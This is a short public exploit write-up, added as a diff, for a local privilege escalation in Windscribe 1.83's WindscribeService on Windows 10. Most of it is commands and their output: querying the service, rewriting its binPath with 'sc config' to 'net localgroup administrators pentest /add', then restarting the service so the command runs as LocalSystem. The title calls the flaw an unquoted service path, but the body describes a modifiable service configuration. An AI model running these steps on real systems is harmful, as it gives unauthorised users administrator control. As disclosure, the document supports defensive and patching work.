@@ -1,0 +1,52 @@
+# Exploit Title: Windscribe 1.83 - 'WindscribeService' Unquoted Service Path
+# Date: 2020-04-10
+# Exploit Author: MgThuraMoeMyint
+# Vendor Homepage: https://windscribe.com
+# Version: v1.83 Build 20
+# Tested on: Windows 10, version 1909
+
+In windscribe v1.83 , there is a service via windscribe that every
+authenticated user can modify.
+
+C:\Users\mgthura>sc qc WindscribeService
+[SC] QueryServiceConfig SUCCESS
+SERVICE_NAME: WindscribeService
+TYPE : 10 WIN32_OWN_PROCESS
+START_TYPE : 2 AUTO_START
+ERROR_CONTROL : 1 NORMAL
+BINARY_PATH_NAME : C:\Program Files (x86)\Windscribe\WindscribeService.exe
+LOAD_ORDER_GROUP :
+TAG : 0
+DISPLAY_NAME : WindscribeService
+DEPENDENCIES :
+SERVICE_START_NAME : LocalSystem
+
+That shows that running as Local System this means that the
+BINARY_PATH_NAME parameter can be modified to execute any command on
+the system.
+I'll change binary_path_name with a command that add a user to
+administrators group , so it will be
+
+C:\Users\mgthura>sc config WindscribeService binPath= "net localgroup
+administrators pentest /add"
+[SC] ChangeServiceConfig SUCCESS
+
+C:\Users\mgthura>sc stop WindscribeService
+
+SERVICE_NAME: WindscribeService
+TYPE : 10 WIN32_OWN_PROCESS
+STATE : 3 STOP_PENDING
+(NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+WIN32_EXIT_CODE : 0 (0x0)
+SERVICE_EXIT_CODE : 0 (0x0)
+CHECKPOINT : 0x4
+WAIT_HINT : 0x0
+
+C:\Users\mgthura>sc start WindscribeService
+[SC] StartService FAILED 1053:
+The service did not respond to the start or control request in a timely fashion.
+
+Restarting service will cause the service to fail as the binary path
+would not point into the actual executable of the service.
+However the command will be executed successfully and the user will be
+added to the local administrators group.
